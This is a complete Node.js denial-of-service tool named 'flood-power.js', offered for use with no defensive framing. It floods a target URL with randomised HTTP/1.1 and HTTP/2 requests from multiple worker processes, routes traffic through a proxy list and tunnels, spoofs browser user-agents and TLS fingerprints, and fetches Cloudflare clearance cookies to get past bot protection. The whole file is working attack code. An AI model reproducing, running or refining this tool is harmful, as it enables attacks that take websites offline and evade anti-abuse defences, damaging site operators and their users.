// flood-power.js
'use strict';

const { cpus }       = require('os');
const cluster        = require('cluster');
const url            = require('url');
const fs             = require('fs');
const crypto         = require('crypto');
const net            = require('net');
const tls            = require('tls');
const http           = require('http');
const http2          = require('http2');
const cloudscraper   = require('cloudscraper');
const { EventEmitter } = require('events');

EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

// ─── BUILT-IN USER-AGENTS ─────────────────────────────────────────────────────
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
    '(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 ' +
    '(KHTML, like Gecko) Version/16.4 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ' +
    '(KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 ' +
    '(KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 ' +
    '(KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 ' +
    '(KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.4; rv:115.0) Gecko/20100101 Firefox/115.0'
];

// ─── ARG PARSING & VALIDATION ─────────────────────────────────────────────────
function usageExit() {
  console.error('Usage: node flood-power.js <MODE> <URL> <DURATION> <RATE> [THREADS] [METHODS...]');
  console.error(' MODE      TLS | HTTP | BOTH');
  console.error(' URL       http:// or https://');
  console.error(' DURATION  seconds');
  console.error(' RATE      reqs/sec per worker');
  console.error(' THREADS   (optional) defaults to CPU cores');
  console.error(' METHODS   GET,POST,HEAD,OPTIONS or RANDOM (default)');
  process.exit(1);
}

if (process.argv.length < 6) usageExit();

const [ , , MODE_RAW, TARGET, DURATION_S, RATE_S, THREADS_S, ...METHODS_RAW ] = process.argv;
const MODE     = MODE_RAW.toUpperCase();
const DURATION = Number(DURATION_S);
const RATE     = Number(RATE_S);
const THREADS  = THREADS_S ? Math.max(1, Number(THREADS_S)) : cpus().length;
const METHODS  = METHODS_RAW.length
  ? METHODS_RAW.map(m=>m.toUpperCase())
  : ['RANDOM'];

if (!['TLS','HTTP','BOTH'].includes(MODE)) usageExit();
if (isNaN(DURATION) || DURATION <= 0) usageExit();
if (isNaN(RATE)     || RATE <= 0)     usageExit();
if (!/^https?:\/\//i.test(TARGET))    usageExit();

const parsed = url.parse(TARGET);
const isTLS  = parsed.protocol === 'https:';

// ─── LOAD PROXIES ────────────────────────────────────────────────────────────
let proxies;
try {
  proxies = fs.readFileSync('proxy.txt','utf8')
              .trim().split(/\r?\n/)
              .filter(Boolean);
  if (!proxies.length) throw new Error();
} catch {
  console.error('Failed to load proxy.txt or it is empty.');
  process.exit(1);
}

// ─── TLS/HTTP2 CONFIG ────────────────────────────────────────────────────────
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
const CIPHERS = 'GREASE:'+
  [defaultCiphers[2],defaultCiphers[1],defaultCiphers[0], ...defaultCiphers.slice(3)].join(':');

const SIGALGS = [
  'ecdsa_secp256r1_sha256','rsa_pss_rsae_sha256','rsa_pkcs1_sha256',
  'ecdsa_secp384r1_sha384','rsa_pss_rsae_sha384','rsa_pkcs1_sha384',
  'rsa_pss_rsae_sha512','rsa_pkcs1_sha512'
].join(':');

const SECURE_OPTS = crypto.constants.SSL_OP_NO_SSLv2 |
                    crypto.constants.SSL_OP_NO_SSLv3 |
                    crypto.constants.SSL_OP_NO_TLSv1 |
                    crypto.constants.SSL_OP_NO_TLSv1_1 |
                    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const TLS_CTX = tls.createSecureContext({
  ciphers:        CIPHERS,
  sigalgs:        SIGALGS,
  honorCipherOrder: true,
  secureOptions:  SECURE_OPTS,
  secureProtocol: 'TLS_client_method'
});

// ─── CLOUDFARE BYPASS SETUP ─────────────────────────────────────────────────
let cfHeaders = {};  // will hold { 'User-Agent': ..., 'Cookie': 'cf_clearance=...' }

async function refreshCf() {
  try {
    const ua = USER_AGENTS[Math.floor(Math.random()*USER_AGENTS.length)];
    const jar = cloudscraper.jar(); // new cookie jar
    await cloudscraper.get({
      uri: TARGET,
      headers: { 'User-Agent': ua },
      jar,
      resolveWithFullResponse: true   // we just need cookies
    });
    const cookieStr = jar.getCookieString(TARGET);
    cfHeaders = {
      'User-Agent': ua,
      'Cookie':     cookieStr
    };
    console.log(`[CF] refreshed cookies: ${cookieStr}`);
  } catch (err) {
    console.warn('[CF] refresh failed, will retry next cycle:', err.message);
  }
}

// initial fetch + periodic (every 5 minutes)
refreshCf();
setInterval(refreshCf, 5 * 60 * 1000);

// ─── HELPERS ────────────────────────────────────────────────────────────────
const pick     = arr => arr[Math.floor(Math.random()*arr.length)];
const readProxy= ()  => { const [h,p]=pick(proxies).split(':'); return { host:h, port:+p }; };
const pickUA   = ()  => cfHeaders['User-Agent'] || pick(USER_AGENTS);
const pickMethod = () => {
  if (METHODS.includes('RANDOM')) return pick(['GET','POST','HEAD','OPTIONS']);
  return pick(METHODS);
};
const randomQuery = () =>
  '?' + Array(8).fill(0).map(_=>Math.random().toString(36).slice(2)).join('&');
const randomJson = () =>
  JSON.stringify({ r: Math.random(), t: Date.now() });

// ─── BURST SCHEDULER ────────────────────────────────────────────────────────
function scheduleBurst(fn) {
  let last = Date.now();
  (function loop() {
    const now   = Date.now();
    const drift= now - last - 1000;
    last = now;
    for (let i=0; i<RATE; i++) fn();
    setTimeout(loop, Math.max(0, 1000 - drift));
  })();
}

// ─── FLOOD FUNCTIONS ────────────────────────────────────────────────────────

// HTTP/1.1 → proxy + keep-alive Agent
function floodHTTP() {
  const proxy = readProxy();
  const method= pickMethod();
  const headers = {
    Host:           parsed.host,
    'User-Agent':   pickUA(),
    'Accept':       '*/*',
    'Cache-Control':'no-cache',
    'Referer':      `https://${parsed.host}/${Math.random().toString(36).slice(2)}`,
    'Content-Type': 'application/json',
    ...cfHeaders
  };
  const opts = {
    host: proxy.host,
    port: proxy.port,
    method,
    path: TARGET + randomQuery(),
    headers,
    agent: new http.Agent({ keepAlive: true, maxSockets: Infinity })
  };
  const req = http.request(opts, res => res.resume());
  if (method==='POST') req.write(randomJson());
  req.on('error',()=>{}).end();
}

// HTTP/2 → CONNECT→TLS tunnel
function floodTLS() {
  const proxy = readProxy();
  const sock  = net.connect(proxy.port, proxy.host);
  sock.setTimeout(15e3);
  sock.once('timeout', ()=>sock.destroy());
  sock.once('error',   ()=>sock.destroy());
  sock.once('data', data => {
    if (!data.toString().includes('200')) return sock.destroy();

    const tlsSock = tls.connect({
      socket:        sock,
      servername:    parsed.host,
      secureContext: TLS_CTX,
      ALPNProtocols: ['h2'],
      rejectUnauthorized: false
    });
    tlsSock.once('error', ()=>tlsSock.destroy());

    const client = http2.connect(TARGET, { createConnection: ()=>tlsSock });
    client.once('error', ()=>client.destroy());
    client.once('connect', ()=>{
      const method = pickMethod();
      const headers = {
        ':method':    method,
        ':path':      parsed.path + randomQuery(),
        ':authority': parsed.host,
        'user-agent': pickUA(),
        'accept':     '*/*',
        'referer':    `https://${parsed.host}/${Math.random().toString(36).slice(2)}`,
        ...cfHeaders
      };
      for (let i=0; i<RATE; i++) {
        const req = client.request(headers);
        if (method==='POST') req.write(randomJson());
        req.on('error',()=>{}).end();
      }
      client.destroy();
    });
  });
}

// ─── MASTER / WORKER BOOTSTRAP ─────────────────────────────────────────────
if (cluster.isMaster) {
  console.log(`🚀 Launching ${THREADS} workers for ${DURATION}s @ ${RATE} r/s [${MODE}]`);
  setTimeout(()=>process.exit(0), DURATION * 1000);
  for (let i=0; i<THREADS; i++) cluster.fork();
  return;
}

// Worker entry
if (MODE==='HTTP' || MODE==='BOTH') scheduleBurst(floodHTTP);
if ((MODE==='TLS' && isTLS) || MODE==='BOTH') scheduleBurst(floodTLS);